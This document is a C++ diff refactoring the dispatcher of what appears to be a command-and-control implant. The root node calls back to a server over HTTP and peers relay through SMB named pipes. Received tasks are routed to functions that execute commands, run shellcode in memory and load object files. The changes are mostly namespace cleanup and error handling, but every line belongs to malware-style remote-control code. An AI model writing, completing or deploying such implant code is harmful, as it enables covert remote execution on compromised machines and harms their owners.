@@ -1,13 +1,13 @@
-#include <core/include/dispatch.hpp>
+#include <include/dispatch.hpp>
+using namespace Utils;
+using namespace Stream;
+using namespace Parser;
+using namespace Clients;
+using namespace Network::Smb;
+using namespace Network::Http;
+using namespace Memory::Execute;
+
 namespace Dispatcher {
-
-    DWORD PeekPeerId(const _stream *const stream) {
-
-        uint32_t pid = 0;
-        x_memcpy(&pid, B_PTR(stream->buffer), 4);
-
-        return pid;
-    }
 
     VOID AddMessage(_stream *const out) {
 
@@ -42,7 +42,7 @@ namespace Dispatcher {
                     Ctx->transport.outbound_queue = head->next;
                 }
 
-                Stream::DestroyStream(head);
+                DestroyStream(head);
                 return;
 
             }
@@ -60,12 +60,12 @@ namespace Dispatcher {
             QueueSegments(B_PTR(msg->buffer), msg->length);
         }
         else {
-            Parser::CreateParser(&parser, B_PTR(msg->buffer), msg->length);
+            CreateParser(&parser, B_PTR(msg->buffer), msg->length);
 
-            queue            = Stream::CreateStream();
-            queue->peer_id   = __builtin_bswap32(Parser::UnpackDword(&parser));
-            queue->task_id   = __builtin_bswap32(Parser::UnpackDword(&parser));
-            queue->msg_type  = __builtin_bswap32(Parser::UnpackDword(&parser));
+            queue            = CreateStream();
+            queue->peer_id   = __builtin_bswap32(UnpackDword(&parser));
+            queue->task_id   = __builtin_bswap32(UnpackDword(&parser));
+            queue->msg_type  = __builtin_bswap32(UnpackDword(&parser));
 
             queue->length   = parser.Length;
             queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));
@@ -73,8 +73,8 @@ namespace Dispatcher {
             x_memcpy(queue->buffer, parser.buffer, queue->length);
             AddMessage(queue);
 
-            Parser::DestroyParser(&parser);
-            Stream::DestroyStream(msg);
+            DestroyParser(&parser);
+            DestroyStream(msg);
         }
     }
 
@@ -101,10 +101,10 @@ namespace Dispatcher {
             queue->task_id    = task_id;
             queue->msg_type   = TypeSegment;
 
-            Stream::PackDword(queue, index);
-            Stream::PackDword(queue, n_seg);
-            Stream::PackDword(queue, cb_seg);
-            Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);
+            PackDword(queue, index);
+            PackDword(queue, n_seg);
+            PackDword(queue, cb_seg);
+            PackBytes(queue, B_PTR(buffer) + offset, cb_seg);
 
             length -= cb_seg;
             offset += cb_seg;
@@ -119,29 +119,24 @@ namespace Dispatcher {
         _parser parser = { };
 
         for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
-            // todo: prepend outbound messages with 0, inbound with 1
-
             if (head->buffer) {
-                if (B_PTR(head->buffer)[0] == INGRESS) {
-                    continue;
-                }
+                CreateParser(&parser, B_PTR(head->buffer), head->length);
 
-                Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
-                Stream::PackDword(out, head->peer_id);
-                Stream::PackDword(out, head->task_id);
-                Stream::PackDword(out, head->msg_type);
+                PackDword(out, head->peer_id);
+                PackDword(out, head->task_id);
+                PackDword(out, head->msg_type);
 
                 if (ROOT_NODE) {
-                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
+                    PackBytes(out, B_PTR(head->buffer), head->length);
                 }
                 else {
-                    Utils::AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
+                    AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
                 }
                 break;
             }
         }
 
-        Parser::DestroyParser(&parser);
+        DestroyParser(&parser);
     }
 
     VOID PrepareIngress(_stream *in) {
@@ -156,7 +151,6 @@ namespace Dispatcher {
         }
         else {
             auto head = Ctx->transport.outbound_queue;
-
             while (head) {
                 head->ready = FALSE;
                 head = head->next;
@@ -164,61 +158,63 @@ namespace Dispatcher {
         }
     }
 
-    VOID DispatchRoutine() {
+    BOOL DispatchRoutine() {
 
-        _stream *out    = Stream::CreateStream();
+        _stream *out    = CreateStream();
         _stream *in     = { };
 
-        retry:
-
+    retry:
         if (!Ctx->transport.outbound_queue) {
             if (ROOT_NODE) {
-                MessageQueue(Stream::CreateStreamWithHeaders(TypeTasking));
+                MessageQueue(CreateStreamWithHeaders(TypeTasking));
                 goto retry;
             }
             else {
-                ntstatus = ERROR_SUCCESS;
-                return;
+                return true;
             }
         }
 
         PrepareEgress(out);
 
         if (ROOT_NODE) {
-            Network::Http::HttpCallback(out, &in);
+            if (!HttpCallback(out, &in)) {
+                return false;
+            }
         }
         else {
-            x_assert(Network::Smb::PipeSend(out));
-            x_assert(Network::Smb::PipeReceive(&in));
+            if (!PipeSend(out) || !PipeReceive(&in)) {
+                return false;
+            }
         }
 
-        Stream::DestroyStream(out);
+        DestroyStream(out);
         PrepareIngress(in);
-        Clients::PushClients();
+        PushPeers();
 
         defer:
+        return true;
     }
 
     VOID CommandDispatch (const _stream *const in) {
 
         _parser parser = { };
 
-        Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
-        Parser::UnpackDword(&parser);
+        CreateParser(&parser, B_PTR(in->buffer), in->length);
+        UnpackDword(&parser);
 
-        auto task_id = Parser::UnpackDword(&parser);
+        auto task_id = UnpackDword(&parser);
         x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
 
-        switch (Parser::UnpackDword(&parser)) {
+        switch (UnpackDword(&parser)) {
             case TypeCheckin:   x_memset(&Ctx->session.checkin, true, sizeof(bool)); break;
-            case TypeTasking:   Memory::Execute::ExecuteCommand(parser); break;
-            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser); break;
-            case TypeObject:    Memory::Execute::LoadObject(parser); break;
+            case TypeTasking:   ExecuteCommand(parser); break;
+            case TypeExecute:   ExecuteShellcode(parser); break;
+            case TypeObject:    LoadObject(parser); break;
 
             default:
                 break;
         }
 
-        Parser::DestroyParser(&parser);
+        DestroyParser(&parser);
     }
 }
